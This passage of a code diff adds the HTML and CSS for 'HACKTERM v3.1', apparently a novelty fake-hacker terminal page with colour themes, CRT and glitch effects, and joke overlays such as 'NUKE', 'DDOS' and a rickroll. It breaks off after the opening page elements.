@@ -1,0 +1,3962 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HACKTERM v3.1</title>
+<style>
+/* ===== RESET & BASE ===== */
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }
+body {
+  font-family: 'Courier New', 'Consolas', 'Monaco', monospace;
+  color: var(--color-text);
+  cursor: default;
+  user-select: none;
+  -webkit-user-select: none;
+}
+
+/* ===== THEME VARIABLES ===== */
+body, body[data-theme="matrix"] {
+  --color-primary: #00ff41;
+  --color-secondary: #008f11;
+  --color-bg: #0a0a0a;
+  --color-panel-bg: rgba(13, 17, 23, 0.85);
+  --color-panel-header: rgba(0, 255, 65, 0.08);
+  --color-border: rgba(0, 255, 65, 0.2);
+  --color-text: #00ff41;
+  --color-dim: rgba(0, 255, 65, 0.5);
+  --color-glow: 0 0 10px rgba(0, 255, 65, 0.3);
+  --color-text-glow: 0 0 8px rgba(0, 255, 65, 0.6);
+  --color-keyword: #66ffaa;
+  --color-type: #00ff88;
+  --color-func: #88ffdd;
+  --color-operator: #33cc66;
+  --color-string: #88ffcc;
+  --color-comment: rgba(0, 136, 68, 0.7);
+  --color-number: #44dd88;
+  --color-preproc: #55ff99;
+  --color-overlay-bg: rgba(0, 20, 0, 0.92);
+  --matrix-opacity: 0.25;
+}
+
+/* Theme 2: CYBERPUNK - hot neon pink/cyan/yellow, saturated like a neon city */
+body[data-theme="cyberpunk"] {
+  --color-primary: #ff2cf1; --color-secondary: #00e5ff;
+  --color-bg: #0c0018; --color-panel-bg: rgba(12, 0, 30, 0.9);
+  --color-panel-header: rgba(255, 44, 241, 0.08); --color-border: rgba(255, 44, 241, 0.2);
+  --color-text: #e0d0ff; --color-dim: rgba(224, 208, 255, 0.5);
+  --color-glow: 0 0 10px rgba(255, 44, 241, 0.25), 0 0 25px rgba(0, 229, 255, 0.1);
+  --color-text-glow: 0 0 8px rgba(255, 44, 241, 0.4);
+  --color-keyword: #ff6ac1;
+  --color-type: #00e5ff;
+  --color-func: #ffd700;
+  --color-operator: #ff9ac1;
+  --color-string: #a5ff90;
+  --color-comment: rgba(136, 100, 200, 0.55);
+  --color-number: #ff9d00;
+  --color-preproc: #ff4081;
+  --color-overlay-bg: rgba(12, 0, 24, 0.92); --matrix-opacity: 0.12;
+}
+
+/* Theme 3: MILITARY - dark blood red bg, tactical combat console */
+body[data-theme="military"] {
+  --color-primary: #cc4444; --color-secondary: #884422;
+  --color-bg: #1a0808; --color-panel-bg: rgba(26, 8, 8, 0.9);
+  --color-panel-header: rgba(204, 68, 68, 0.08); --color-border: rgba(204, 68, 68, 0.2);
+  --color-text: #cc9966; --color-dim: rgba(204, 153, 102, 0.5);
+  --color-glow: 0 0 10px rgba(204, 68, 68, 0.2); --color-text-glow: 0 0 6px rgba(204, 68, 68, 0.3);
+  --color-keyword: #e05555;
+  --color-type: #cc8844;
+  --color-func: #ddaa66;
+  --color-operator: #aa6644;
+  --color-string: #ccbb44;
+  --color-comment: rgba(80, 160, 80, 0.65);
+  --color-number: #dd8855;
+  --color-preproc: #66aa55;
+  --color-overlay-bg: rgba(20, 6, 6, 0.92); --matrix-opacity: 0.12;
+}
+
+/* Theme 4: RED ALERT */
+body[data-theme="redalert"] {
+  --color-primary: #ff0040; --color-secondary: #cc0033;
+  --color-bg: #0a0002; --color-panel-bg: rgba(20, 0, 5, 0.88);
+  --color-panel-header: rgba(255, 0, 64, 0.08); --color-border: rgba(255, 0, 64, 0.25);
+  --color-text: #ff0040; --color-dim: rgba(255, 0, 64, 0.5);
+  --color-glow: 0 0 10px rgba(255, 0, 64, 0.3); --color-text-glow: 0 0 8px rgba(255, 0, 64, 0.6);
+  --color-keyword: #ff6688;
+  --color-type: #ff4488;
+  --color-func: #ff8899;
+  --color-operator: #cc3355;
+  --color-string: #ff4466;
+  --color-comment: rgba(204, 0, 51, 0.5);
+  --color-number: #ff8899;
+  --color-preproc: #ff3366;
+  --color-overlay-bg: rgba(15, 0, 2, 0.92); --matrix-opacity: 0.2;
+}
+
+/* Theme 5: DARK CYBER - modern editor meets cyberpunk */
+body[data-theme="darkcyber"] {
+  --color-primary: #a78bfa; --color-secondary: #06b6d4;
+  --color-bg: #0f1117; --color-panel-bg: rgba(15, 17, 23, 0.92);
+  --color-panel-header: rgba(167, 139, 250, 0.06); --color-border: rgba(167, 139, 250, 0.15);
+  --color-text: #c4b5fd; --color-dim: rgba(196, 181, 253, 0.45);
+  --color-glow: 0 0 10px rgba(167, 139, 250, 0.15), 0 0 20px rgba(6, 182, 212, 0.05);
+  --color-text-glow: 0 0 6px rgba(167, 139, 250, 0.3);
+  --color-keyword: #c084fc;
+  --color-type: #67e8f9;
+  --color-func: #e879f9;
+  --color-operator: #a78bfa;
+  --color-string: #22d3ee;
+  --color-comment: rgba(100, 116, 139, 0.6);
+  --color-number: #f59e0b;
+  --color-preproc: #f472b6;
+  --color-overlay-bg: rgba(10, 12, 18, 0.94); --matrix-opacity: 0.1;
+}
+
+/* Theme 6: SYNTHWAVE - neon purple/pink vaporwave grid aesthetic */
+body[data-theme="synthwave"] {
+  --color-primary: #e040fb; --color-secondary: #7c4dff;
+  --color-bg: #110022; --color-panel-bg: rgba(17, 0, 40, 0.9);
+  --color-panel-header: rgba(224, 64, 251, 0.08); --color-border: rgba(224, 64, 251, 0.2);
+  --color-text: #e8b0ff; --color-dim: rgba(232, 176, 255, 0.5);
+  --color-glow: 0 0 12px rgba(224, 64, 251, 0.3), 0 0 25px rgba(124, 77, 255, 0.1);
+  --color-text-glow: 0 0 10px rgba(224, 64, 251, 0.5);
+  --color-keyword: #ff7edb;
+  --color-type: #36f9f6;
+  --color-func: #fede5d;
+  --color-operator: #ff7edb;
+  --color-string: #ff8b39;
+  --color-comment: rgba(126, 112, 163, 0.6);
+  --color-number: #ff7edb;
+  --color-preproc: #36f9f6;
+  --color-overlay-bg: rgba(15, 0, 30, 0.93); --matrix-opacity: 0.15;
+}
+
+/* Theme 7: DEEP BLACK - minimal dev, teal/purple on pure black */
+body[data-theme="deepblack"] {
+  --color-primary: #56d4c8; --color-secondary: #8b5cf6;
+  --color-bg: #050505; --color-panel-bg: rgba(8, 8, 12, 0.92);
+  --color-panel-header: rgba(86, 212, 200, 0.05); --color-border: rgba(86, 212, 200, 0.12);
+  --color-text: #8899aa; --color-dim: rgba(136, 153, 170, 0.45);
+  --color-glow: 0 0 8px rgba(86, 212, 200, 0.1); --color-text-glow: 0 0 4px rgba(86, 212, 200, 0.15);
+  --color-keyword: #5ce0d6;
+  --color-type: #b48afe;
+  --color-func: #c0c8d4;
+  --color-operator: #5c8a88;
+  --color-string: #8cc88a;
+  --color-comment: rgba(85, 100, 120, 0.55);
+  --color-number: #d4a054;
+  --color-preproc: #cc6688;
+  --color-overlay-bg: rgba(5, 5, 8, 0.95); --matrix-opacity: 0.06;
+}
+body[data-theme="redalert"] #app { animation: redPulse 2s ease-in-out infinite; }
+@keyframes redPulse {
+  0%, 100% { box-shadow: inset 0 0 30px rgba(255, 0, 64, 0.05); }
+  50% { box-shadow: inset 0 0 60px rgba(255, 0, 64, 0.15); }
+}
+
+/* ===== CRT EFFECTS ===== */
+#crt-overlay { position: fixed; inset: 0; z-index: 9999; pointer-events: none; }
+#crt-overlay.disabled { display: none; }
+#crt-overlay::before {
+  content: ''; position: absolute; inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 1px, rgba(0,0,0,0.12) 1px, rgba(0,0,0,0.12) 2px);
+  z-index: 1;
+}
+#crt-overlay::after {
+  content: ''; position: absolute; inset: 0;
+  background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.65) 100%);
+  z-index: 2;
+}
+@keyframes flicker {
+  0%, 19.9%, 22%, 63%, 64%, 65%, 70%, 100% { opacity: 1; }
+  20%, 21.9% { opacity: 0.96; } 63.1%, 63.9% { opacity: 0.97; } 65.1%, 69.9% { opacity: 0.98; }
+}
+#app { animation: flicker 4s steps(1) infinite; }
+
+/* ===== CANVASES ===== */
+#matrix-rain { position: fixed; inset: 0; z-index: 0; opacity: var(--matrix-opacity); }
+#particles { position: fixed; inset: 0; z-index: 100; pointer-events: none; }
+
+/* ===== APP LAYOUT ===== */
+#app {
+  position: relative; z-index: 1;
+  display: grid;
+  grid-template-columns: 200px 1fr 240px;
+  grid-template-rows: 30px 1fr 26px;
+  grid-template-areas: "top top top" "left main right" "bottom bottom bottom";
+  height: 100vh; gap: 2px; padding: 2px;
+  overflow: hidden;
+}
+
+/* ===== TOP BAR ===== */
+#top-bar {
+  grid-area: top; display: flex; align-items: center; justify-content: space-between;
+  padding: 0 12px; font-size: 11px; letter-spacing: 1px;
+  background: var(--color-panel-bg); border-bottom: 1px solid var(--color-border);
+  color: var(--color-dim); text-shadow: var(--color-text-glow);
+}
+#top-bar .status-dot {
+  display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+  background: var(--color-primary); margin-right: 6px; animation: pulse 1.5s ease-in-out infinite;
+}
+@keyframes pulse {
+  0%, 100% { opacity: 1; box-shadow: 0 0 4px var(--color-primary); }
+  50% { opacity: 0.4; box-shadow: none; }
+}
+
+/* ===== PANELS ===== */
+.panel {
+  background: var(--color-panel-bg); border: 1px solid var(--color-border);
+  box-shadow: var(--color-glow); overflow: hidden; display: flex; flex-direction: column;
+}
+.panel-header {
+  padding: 4px 8px; font-size: 10px; letter-spacing: 1.5px; text-transform: uppercase;
+  background: var(--color-panel-header); border-bottom: 1px solid var(--color-border);
+  color: var(--color-dim); flex-shrink: 0; display: flex; justify-content: space-between; align-items: center;
+}
+
+/* ===== LEFT SIDEBAR ===== */
+#left-panel { grid-area: left; display: flex; flex-direction: column; gap: 2px; }
+#file-tree { flex: 1; }
+#file-tree-content { padding: 6px 8px; font-size: 11px; line-height: 1.6; overflow-y: auto; flex: 1; color: var(--color-dim); }
+.ft-folder { color: var(--color-primary); }
+.ft-file { color: var(--color-dim); padding-left: 4px; }
+#system-stats { flex-shrink: 0; height: 130px; }
+#stats-content { padding: 6px 8px; font-size: 10px; flex: 1; display: flex; flex-direction: column; justify-content: space-around; }
+.stat-row { display: flex; align-items: center; gap: 6px; }
+.stat-label { width: 32px; font-size: 9px; letter-spacing: 1px; color: var(--color-dim); }
+.stat-bar-bg { flex: 1; height: 8px; background: rgba(255,255,255,0.03); border: 1px solid var(--color-border); position: relative; overflow: hidden; }
+.stat-bar-fill { position: absolute; left: 0; top: 0; bottom: 0; width: 0%; background: var(--color-primary); opacity: 0.6; transition: width 0.3s ease; }
+.stat-pct { width: 28px; text-align: right; font-size: 9px; color: var(--color-dim); }
+
+/* ===== MAIN TERMINAL ===== */
+#terminal { grid-area: main; min-height: 0; overflow: hidden; }
+#code-output {
+  flex: 1; min-height: 0; padding: 8px 10px; font-size: 13px; line-height: 1.5;
+  overflow-y: scroll; overflow-x: hidden; word-wrap: break-word; white-space: pre-wrap;
+  color: var(--color-text); text-shadow: var(--color-text-glow);
+  scrollbar-width: none; /* hide scrollbar — text just flows */
+}
+#code-output::-webkit-scrollbar { display: none; }
+#code-output-inner {
+  word-wrap: break-word; white-space: pre-wrap;
+}
+#code-output-spacer {
+  flex-shrink: 0;
+}
+.hl-keyword { color: var(--color-keyword); font-weight: bold; }
+.hl-type { color: var(--color-type); }
+.hl-func { color: var(--color-func); }
+.hl-operator { color: var(--color-operator); font-weight: bold; }
+.hl-string { color: var(--color-string); }
+.hl-comment { color: var(--color-comment); font-style: italic; }
+.hl-number { color: var(--color-number); }
+.hl-preproc { color: var(--color-preproc); }
+
+/* ===== RIGHT SIDEBAR ===== */
+#right-panel { grid-area: right; display: flex; flex-direction: column; gap: 2px; }
+#radar-panel { flex-shrink: 0; height: 240px; }
+#radar-canvas { width: 100%; flex: 1; }
+#log-panel { flex: 1; min-height: 0; }
+#log-content {
+  padding: 4px 6px; font-size: 9.5px; line-height: 1.5; overflow-y: auto; flex: 1;
+  color: var(--color-dim); scrollbar-width: thin; scrollbar-color: var(--color-border) transparent;
+}
+#log-content::-webkit-scrollbar { width: 3px; }
+#log-content::-webkit-scrollbar-track { background: transparent; }
+#log-content::-webkit-scrollbar-thumb { background: var(--color-border); }
+.log-line { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.log-line .log-tag { color: var(--color-primary); }
+.log-line .log-time { color: var(--color-comment); }
+
+/* ===== BOTTOM BAR ===== */
+#bottom-bar {
+  grid-area: bottom; display: flex; align-items: center; justify-content: center;
+  padding: 0 12px; font-size: 9px; letter-spacing: 0.5px;
+  background: var(--color-panel-bg); border-top: 1px solid var(--color-border);
+  color: var(--color-dim); overflow: hidden; white-space: nowrap; gap: 8px;
+}
+#bottom-bar span { opacity: 0.7; }
+#bottom-bar .key { color: var(--color-primary); font-weight: bold; }
+
+/* ===== OVERLAYS ===== */
+.overlay {
+  position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center;
+  font-size: clamp(24px, 5vw, 72px); font-weight: bold; letter-spacing: 8px;
+  background: var(--color-overlay-bg); color: var(--color-primary);
+  text-shadow: 0 0 40px var(--color-primary), 0 0 80px var(--color-primary);
+  z-index: 5000; opacity: 0; transform: scale(0.9);
+  transition: opacity 0.2s, transform 0.2s; pointer-events: none;
+}
+.overlay.active { opacity: 1; transform: scale(1); }
+.overlay.active.interactive { pointer-events: auto; }
+.overlay.exit { opacity: 0; transform: scale(1.05); }
+.overlay-sub { font-size: clamp(12px, 2vw, 24px); letter-spacing: 3px; margin-top: 20px; opacity: 0.7; }
+
+/* ACCESS DENIED special styling */
+#overlay-denied { color: #ff0000 !important; text-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000 !important; background: rgba(20, 0, 0, 0.94) !important; }
+#overlay-denied.active { animation: deniedFlash 0.3s steps(1) infinite; }
+@keyframes deniedFlash {
+  0%, 49% { opacity: 1; }
+  50%, 100% { opacity: 0.6; }
+}
+#overlay-denied .overlay-sub { color: #ff4444; }
+
+/* DOWNLOAD overlay */
+#download-bar-container { width: 60%; max-width: 500px; height: 20px; border: 1px solid var(--color-primary); margin-top: 30px; position: relative; overflow: hidden; }
+#download-bar-fill { height: 100%; width: 0%; background: var(--color-primary); opacity: 0.6; transition: width 0.1s; }
+#download-pct { font-size: clamp(14px, 2vw, 28px); margin-top: 10px; letter-spacing: 4px; }
+.overlay-scroll-list {
+  position: absolute; left: 0; top: 0; bottom: 0; width: 280px;
+  font-size: 10px; letter-spacing: 1px; line-height: 1.6; padding: 10px;
+  overflow: hidden; text-align: left; opacity: 0.5; color: var(--color-primary);
+  font-weight: normal;
+}
+
+/* TRACE overlay */
+#trace-ip-display { font-size: clamp(16px, 3vw, 40px); margin-top: 20px; letter-spacing: 4px; font-variant-numeric: tabular-nums; }
+#trace-graph-container { position: absolute; right: 20px; top: 50%; transform: translateY(-50%); width: 300px; height: 300px; }
+#trace-graph-canvas { width: 100%; height: 100%; }
+
+/* ENCRYPT overlay */
+#overlay-encrypt.active {
+  background: rgba(0, 30, 0, 0.96) !important;
+  color: #ffdd00 !important;
+  text-shadow: 0 0 30px #ffdd00, 0 0 60px #ffdd00 !important;
+}
+#encrypt-stream {
+  position: absolute; inset: 0; font-size: 11px; line-height: 1.3; color: #00ff41;
+  opacity: 0.3; overflow: hidden; pointer-events: none; white-space: pre; padding: 10px;
+  font-weight: normal; letter-spacing: 1px;
+}
+#encrypt-scramble { font-size: clamp(10px, 1.5vw, 18px); margin-top: 20px; letter-spacing: 2px; opacity: 0.8; max-width: 80%; text-align: center; word-break: break-all; color: #ffdd00; }
+
+/* FIREWALL overlay */
+#firewall-canvas { position: absolute; inset: 0; }
+
+/* SATELLITE overlay */
+#overlay-satellite.active { pointer-events: auto; cursor: default; }
+#satellite-canvas { position: absolute; inset: 0; }
+.sat-label {
+  font-size: clamp(10px, 1.2vw, 14px); letter-spacing: 2px; margin-top: 10px;
+  opacity: 0.7; font-weight: normal;
+}
+
+/* ===== SETTINGS MODAL ===== */
+#settings-modal {
+  position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 6000;
+  background: var(--color-panel-bg); border: 1px solid var(--color-primary);
+  box-shadow: 0 0 40px rgba(0,0,0,0.8), var(--color-glow);
+  padding: 24px 32px; min-width: 300px; backdrop-filter: blur(10px);
+}
+#settings-modal.hidden { display: none; }
+#settings-modal h2 { font-size: 14px; letter-spacing: 3px; margin-bottom: 20px; color: var(--color-primary); text-shadow: var(--color-text-glow); }
+.setting-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; font-size: 11px; letter-spacing: 1px; color: var(--color-dim); }
+.setting-row label { flex: 1; }
+.toggle-btn { background: none; border: 1px solid var(--color-border); color: var(--color-dim); padding: 3px 12px; font-family: inherit; font-size: 10px; letter-spacing: 1px; cursor: pointer; }
+.toggle-btn.active { border-color: var(--color-primary); color: var(--color-primary); box-shadow: 0 0 8px var(--color-border); }
+.toggle-btn:hover { border-color: var(--color-primary); }
+input[type="range"] { -webkit-appearance: none; width: 100px; height: 4px; background: var(--color-border); outline: none; border-radius: 2px; }
+input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; width: 12px; height: 12px; border-radius: 50%; background: var(--color-primary); cursor: pointer; }
+
+/* ===== FULLSCREEN PROMPT ===== */
+#fs-prompt {
+  position: fixed; bottom: 50px; left: 50%; transform: translateX(-50%); z-index: 7000;
+  font-size: 12px; letter-spacing: 2px; color: var(--color-dim);
+  background: var(--color-panel-bg); border: 1px solid var(--color-border);
+  padding: 8px 20px; opacity: 1; transition: opacity 1s; pointer-events: none;
+}
+#fs-prompt.fade { opacity: 0; }
+
+/* ===== GLITCH (chromatic aberration) ===== */
+.glitch-active #app {
+  animation: glitchAberration 0.15s steps(2) infinite !important;
+}
+@keyframes glitchAberration {
+  0% { filter: none; transform: translate(0); }
+  20% { filter: none; transform: translate(-2px, 1px); }
+  40% { filter: none; transform: translate(1px, -1px); }
+  60% { filter: none; transform: translate(-1px, 0); }
+  80% { filter: none; transform: translate(2px, 1px); }
+  100% { filter: none; transform: translate(0); }
+}
+.glitch-active::before {
+  content: ''; position: fixed; inset: 0; z-index: 9998; pointer-events: none;
+  background: linear-gradient(transparent 0%, rgba(255,0,0,0.03) 33%, rgba(0,255,0,0.02) 66%, rgba(0,0,255,0.03) 100%);
+  animation: rgbShift 0.12s steps(3) infinite;
+}
+.glitch-active::after {
+  content: ''; position: fixed; inset: 0; z-index: 9997; pointer-events: none;
+  box-shadow: inset -4px 0 rgba(255,0,0,0.15), inset 4px 0 rgba(0,255,255,0.15);
+  animation: aberrationPull 0.2s ease-in-out infinite alternate;
+}
+@keyframes rgbShift {
+  0% { background-position: 0 0; opacity: 0.8; }
+  50% { background-position: 3px -2px; opacity: 1; }
+  100% { background-position: -2px 1px; opacity: 0.6; }
+}
+@keyframes aberrationPull {
+  0% { box-shadow: inset -3px 0 rgba(255,0,0,0.12), inset 3px 0 rgba(0,255,255,0.12); }
+  50% { box-shadow: inset -8px 0 rgba(255,0,0,0.2), inset 8px 0 rgba(0,255,255,0.2); }
+  100% { box-shadow: inset -3px 0 rgba(255,0,0,0.12), inset 3px 0 rgba(0,255,255,0.12); }
+}
+.glitch-active #code-output {
+  text-shadow: 3px 0 rgba(255,0,0,0.4), -3px 0 rgba(0,255,255,0.4) !important;
+}
+
+/* ===== TERMINAL POPUP ===== */
+#terminal-popup {
+  position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%);
+  width: 900px; height: 450px; z-index: 5500;
+  background: rgba(10, 10, 15, 0.95); border: 1px solid var(--color-primary);
+  box-shadow: 0 0 20px rgba(0,0,0,0.8), 0 0 10px var(--color-primary);
+  display: flex; flex-direction: column; font-size: 13px;
+  backdrop-filter: blur(6px);
+}
+#terminal-popup.hidden { display: none; }
+#terminal-popup-titlebar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 4px 10px; background: var(--color-panel-header);
+  border-bottom: 1px solid var(--color-border); flex-shrink: 0;
+  font-size: 10px; letter-spacing: 1.5px; color: var(--color-dim); text-transform: uppercase;
+}
+#terminal-popup-close {
+  background: none; border: 1px solid var(--color-border); color: var(--color-dim);
+  font-family: inherit; font-size: 11px; cursor: pointer; padding: 1px 6px;
+  letter-spacing: 1px;
+}
+#terminal-popup-close:hover { border-color: var(--color-primary); color: var(--color-primary); }
+#terminal-popup-output {
+  flex: 1; min-height: 0; padding: 6px 10px; overflow-y: auto; color: var(--color-dim);
+  font-size: 12px; line-height: 1.5; word-wrap: break-word; white-space: pre-wrap;
+  scrollbar-width: thin; scrollbar-color: var(--color-border) transparent;
+}
+#terminal-popup-output::-webkit-scrollbar { width: 4px; }
+#terminal-popup-output::-webkit-scrollbar-track { background: transparent; }
+#terminal-popup-output::-webkit-scrollbar-thumb { background: var(--color-border); }
+#terminal-popup-input-line {
+  display: flex; align-items: center; padding: 6px 10px;
+  border-top: 1px solid var(--color-border);
+  background: rgba(0,0,0,0.4); flex-shrink: 0;
+  color: var(--color-primary);
+}
+.prompt-caret { color: var(--color-keyword); margin-right: 8px; white-space: nowrap; font-weight: bold; }
+#prompt-input { color: var(--color-text); white-space: pre; }
+.prompt-cursor { animation: blink 0.7s step-end infinite; color: var(--color-primary); font-weight: bold; }
+@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+.cmd-output { color: var(--color-dim); font-size: 12px; line-height: 1.5; padding: 2px 0; }
+.cmd-output .cmd-highlight { color: var(--color-primary); font-weight: bold; }
+.cmd-output .cmd-error { color: #ff4444; }
+.cmd-output .cmd-success { color: #44ff44; }
+.cmd-echo { color: var(--color-comment); font-size: 12px; padding: 2px 0; }
+
+/* ===== BOOT SCREEN ===== */
+#boot-screen {
+  position: fixed; inset: 0; z-index: 10000; background: #000;
+  display: flex; align-items: flex-start; justify-content: flex-start;
+  padding: 40px; font-family: 'Courier New', monospace; font-size: 14px;
+  color: #00ff41; overflow: hidden;
+}
+#boot-screen.hidden { display: none; }
+#boot-screen.fade-out { opacity: 0; transition: opacity 0.8s ease; }
+#boot-text { white-space: pre-wrap; line-height: 1.6; text-shadow: 0 0 8px rgba(0,255,65,0.6); }
+
+/* ===== PRANK MODE (FAKE DESKTOP) ===== */
+#prank-overlay {
+  position: fixed; inset: 0; z-index: 8000; background: #008080;
+  display: none; flex-direction: column; font-family: 'Segoe UI', Tahoma, sans-serif;
+  cursor: default; user-select: none;
+}
+#prank-overlay.active { display: flex; }
+#prank-desktop { flex: 1; position: relative; padding: 20px; }
+.prank-icon {
+  display: flex; flex-direction: column; align-items: center; gap: 4px;
+  width: 80px; text-align: center; margin-bottom: 16px; cursor: pointer;
+}
+.prank-icon-img {
+  width: 48px; height: 48px; display: flex; align-items: center; justify-content: center;
+  font-size: 32px;
+}
+.prank-icon-label {
+  font-size: 11px; color: #fff; text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
+  padding: 1px 2px;
+}
+#prank-taskbar {
+  height: 40px; background: linear-gradient(to right, #245edb, #3a7bff, #245edb);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 8px; border-top: 2px solid #5a9aff;
+}
+#prank-start-btn {
+  background: linear-gradient(to bottom, #3c8f3c, #2d6e2d);
+  border: 1px solid #1a4a1a; border-radius: 4px; padding: 4px 16px;
+  color: white; font-weight: bold; font-size: 13px; cursor: pointer;
+  display: flex; align-items: center; gap: 6px;
+}
+#prank-clock {
+  color: white; font-size: 12px; background: rgba(0,0,100,0.3);
+  padding: 4px 10px; border: 1px inset rgba(255,255,255,0.2);
+}
+#prank-tray {
+  display: flex; align-items: center; gap: 8px; color: white; font-size: 11px;
+}
+
+/* ===== SCREEN CRACK EFFECT ===== */
+#crack-overlay {
+  position: fixed; inset: 0; z-index: 5100; pointer-events: none;
+  opacity: 0; transition: opacity 0.3s;
+}
+#crack-overlay.active { opacity: 1; }
+#crack-overlay.fade-out { opacity: 0; transition: opacity 0.5s; }
+#crack-overlay svg { width: 100%; height: 100%; }
+#crack-overlay line {
+  stroke: rgba(255,255,255,0.8); stroke-width: 1.5;
+  filter: drop-shadow(0 0 4px rgba(255,255,255,0.6));
+  stroke-dasharray: 200; stroke-dashoffset: 200;
+  animation: crackDraw 0.3s ease-out forwards;
+}
+@keyframes crackDraw { to { stroke-dashoffset: 0; } }
+
+/* ===== PIZZA OVERLAY ===== */
+#overlay-pizza {
+  background: rgba(0, 10, 0, 0.95) !important;
+  color: var(--color-primary) !important;
+}
+#pizza-loading { font-size: clamp(16px, 3vw, 28px); letter-spacing: 3px; }
+@keyframes pizzaSpin {
+  0% { transform: rotate(0deg) scale(1); }
+  25% { transform: rotate(90deg) scale(1.1); }
+  50% { transform: rotate(180deg) scale(1); }
+  75% { transform: rotate(270deg) scale(1.1); }
+  100% { transform: rotate(360deg) scale(1); }
+}
+.pizza-spin { animation: pizzaSpin 1s linear infinite; display: inline-block; font-size: 60px; }
+
+/* ===== NUKE OVERLAY ===== */
+#overlay-nuke {
+  background: rgba(30, 0, 0, 0.95) !important;
+  color: #ff0000 !important;
+  text-shadow: 0 0 40px #ff0000, 0 0 80px #ff3300, 0 0 120px #ff0000 !important;
+}
+#nuke-countdown { font-size: clamp(48px, 10vw, 150px); margin-top: 20px; font-variant-numeric: tabular-nums; }
+@keyframes nukeFlash {
+  0% { background: rgba(255,255,255,0.9); }
+  100% { background: rgba(30,0,0,0.95); }
+}
+
+/* ===== DDOS OVERLAY ===== */
+#ddos-counter { font-size: clamp(20px, 4vw, 50px); margin-top: 20px; font-variant-numeric: tabular-nums; letter-spacing: 3px; }
+#ddos-bar-container { width: 50%; max-width: 400px; height: 16px; border: 1px solid var(--color-primary); margin-top: 20px; overflow: hidden; }
+#ddos-bar-fill { height: 100%; width: 0%; background: var(--color-primary); opacity: 0.6; transition: width 0.1s; }
+
+/* ===== RICKROLL OVERLAY ===== */
+#overlay-rickroll { background: rgba(0,0,0,0.95) !important; }
+@keyframes rainbowText {
+  0% { color: #ff0000; text-shadow: 0 0 40px #ff0000; }
+  16% { color: #ff8800; text-shadow: 0 0 40px #ff8800; }
+  33% { color: #ffff00; text-shadow: 0 0 40px #ffff00; }
+  50% { color: #00ff00; text-shadow: 0 0 40px #00ff00; }
+  66% { color: #0088ff; text-shadow: 0 0 40px #0088ff; }
+  83% { color: #8800ff; text-shadow: 0 0 40px #8800ff; }
+  100% { color: #ff0000; text-shadow: 0 0 40px #ff0000; }
+}
+#overlay-rickroll.active { animation: rainbowText 0.8s linear infinite; }
+
+/* ===== HACKER POPUPS ===== */
+.hacker-popup {
+  position: fixed; z-index: 4000;
+  width: 640px; min-height: 320px; max-height: 600px;
+  background: rgba(10, 10, 15, 0.93);
+  border: 1px solid var(--color-primary);
+  box-shadow: 0 0 18px rgba(0,0,0,0.7), 0 0 8px var(--color-primary);
+  display: flex; flex-direction: column;
+  font-family: 'Courier New', 'Consolas', monospace;
+  font-size: 12px; color: var(--color-text);
+  backdrop-filter: blur(5px);
+  opacity: 0; transform: scale(0.92);
+  animation: hackerPopupIn 0.3s ease forwards;
+  overflow: hidden;
+}
+.hacker-popup.closing {
+  animation: hackerPopupOut 0.25s ease forwards;
+}
+@keyframes hackerPopupIn {
+  from { opacity: 0; transform: scale(0.92); }
+  to { opacity: 1; transform: scale(1); }
+}
+@keyframes hackerPopupOut {
+  from { opacity: 1; transform: scale(1); }
+  to { opacity: 0; transform: scale(0.92); }
+}
+.hacker-popup-titlebar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 4px 10px; background: var(--color-panel-header);
+  border-bottom: 1px solid var(--color-border); flex-shrink: 0;
+  font-size: 10px; letter-spacing: 1.5px; color: var(--color-dim);
+  text-transform: uppercase; user-select: none;
+}
+.hacker-popup-close {
+  background: none; border: 1px solid var(--color-border); color: var(--color-dim);
+  font-family: inherit; font-size: 11px; cursor: pointer; padding: 1px 6px;
+  letter-spacing: 1px;
+}
+.hacker-popup-close:hover { border-color: var(--color-primary); color: var(--color-primary); }
+.hacker-popup-content {
+  flex: 1; padding: 8px 10px; overflow: hidden;
+  color: var(--color-text); line-height: 1.4;
+}
+.hacker-popup-content .danger { color: #ff2222; font-weight: bold; }
+.hacker-popup-content .success { color: #44ff44; }
+.hacker-popup-content .dim { color: var(--color-dim); }
+.hacker-popup-content .progress-bar {
+  width: 100%; height: 14px; border: 1px solid var(--color-border);
+  background: rgba(0,0,0,0.5); margin: 6px 0; position: relative; overflow: hidden;
+}
+.hacker-popup-content .progress-bar-fill {
+  height: 100%; background: var(--color-primary); width: 0%;
+  transition: width 0.15s linear;
+}
+.hacker-popup-content .wordle-row {
+  display: flex; gap: 3px; margin: 3px 0;
+}
+.hacker-popup-content .wordle-cell {
+  width: 26px; height: 26px; display: flex; align-items: center; justify-content: center;
+  font-weight: bold; font-size: 13px; border: 1px solid var(--color-border);
+}
+.hacker-popup-content .wc-green { background: #538d4e; color: #fff; }
+.hacker-popup-content .wc-yellow { background: #b59f3b; color: #fff; }
+.hacker-popup-content .wc-gray { background: #3a3a3c; color: #888; }
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 900px) {
+  #app { grid-template-columns: 1fr 220px; grid-template-areas: "top top" "main right" "bottom bottom"; }
+  #left-panel { display: none; }
+}
+@media (max-width: 600px) {
+  #app { grid-template-columns: 1fr; grid-template-rows: 30px 1fr 26px; grid-template-areas: "top" "main" "bottom"; }
+  #left-panel, #right-panel { display: none; }
+}
+</style>
+</head>
+<body data-theme="matrix">
+<div id="boot-screen"><div id="boot-text"></div></div>
+<div id="crt-overlay"></div>
+<canvas id="matrix-rain"></canvas>
+<canvas id="particles"></canvas>
+
